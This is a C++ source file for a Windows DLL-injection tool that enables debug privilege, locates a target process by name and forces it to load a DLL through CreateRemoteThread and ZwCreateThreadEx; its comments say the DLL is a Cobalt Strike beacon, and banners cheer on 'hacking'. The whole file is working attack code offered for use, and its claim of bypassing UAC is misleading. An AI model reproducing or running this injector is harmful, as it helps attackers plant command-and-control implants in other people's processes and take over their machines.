#include<iostream>
#include<tchar.h>
#include <cstring>
#include<Windows.h>
#include<Tlhelp32.h>
#include <cctype> 
using namespace std;
#pragma comment(linker, "/section:.data,RWE")

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void DLLInject(DWORD pid,LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE OriginalProcessHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[*] Get OriginalProcessHandle Successfully :)" << endl;
	}
	//2.远程申请内存
	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);
	PVOID  RemoteMemory = VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}else {
		cout << "	[*] VirtualAlloc Address Successfully :)" << endl;
	} 
	//3.将CS上线的DLL写入内存
	BOOL WriteStatus = WriteProcessMemory(OriginalProcessHandle,RemoteMemory,dllpath,length,NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}else
	{
		cout << "	[*] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	//4.获取LoadLibrary地址
	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	//5.声明ZwCreateThreadEx函数
	#ifdef _WIN64
		typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
			PHANDLE ThreadHandle,
			ACCESS_MASK DesiredAccess,
			LPVOID ObjectAttributes,
			HANDLE ProcessHandle,
			LPTHREAD_START_ROUTINE lpStartAddress,
			LPVOID lpParameter,
			ULONG CreateThreadFlags,
			SIZE_T ZeroBits,
			SIZE_T StackSize,
			SIZE_T MaximumStackSize,
			LPVOID pUnkown);
	#else
		typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
			PHANDLE ThreadHandle,
			ACCESS_MASK DesiredAccess,
			LPVOID ObjectAttributes,
			HANDLE ProcessHandle,
			LPTHREAD_START_ROUTINE lpStartAddress,
			LPVOID lpParameter,
			BOOL CreateSuspended,
			DWORD dwStackSize,
			DWORD dw1,
			DWORD dw2,
			LPVOID pUnkown);
	#endif
	//6.获取NTDLL中ZwCreateThreadEx函数
	 typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	 if (ZwCreateThreadEx == NULL)
	 {
		 cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		 return;
	 }
	 else {
		 cout << "	[*] Get ZwCreateThreadEx Address Successfully :)" << endl;
	 }
	//5.创建线程 ring3调用CreateRemoteThread
	HANDLE RemoteHandle = CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory,0,NULL);
	if (RemoteHandle == NULL)
	{
		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
		return;
		
	}else {
		cout << "	[*] Ring3 Thread Inject Successfully :)" << endl;
	}
	
	//7.创建线程  ring0调用ZwCreateThreadEx
	 HANDLE hRemoteThread;
	 DWORD Status = 0;
	 Status = ZwCreateThreadEx(&hRemoteThread,PROCESS_ALL_ACCESS,NULL,OriginalProcessHandle,(LPTHREAD_START_ROUTINE)LoadLibraryHandle,RemoteMemory,0,0,0,0,NULL);
	 if (Status == NULL)
	 {
		 cout << "	[*] Ring0 Thread Inject Successfully :)" << endl;
	 }
	 else
	 {
		 cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
		 return;
	 }
	 WaitForSingleObject(RemoteHandle, -1);
 	 //8.释放DLL空间
	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
	 //9.关闭句柄
	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[*] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}


int _tmain(int argc,TCHAR * argv[])
{

	if (argc == 3) {
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			//
			cout << "-----------------------------!!START!!--------------------------------" << endl;
			cout << "	[*] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
		}
		else {
			cout << "-----------------------------!!START!!--------------------------------" << endl;
			cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;

		}

		DWORD PID = GetProcessPID(argv[1]);  //必须小写
		
		DLLInject(PID,argv[2]);
	}
	else
	{
		cout << "	[-] Two Parameters are required" << endl;
	}

	return 0;
}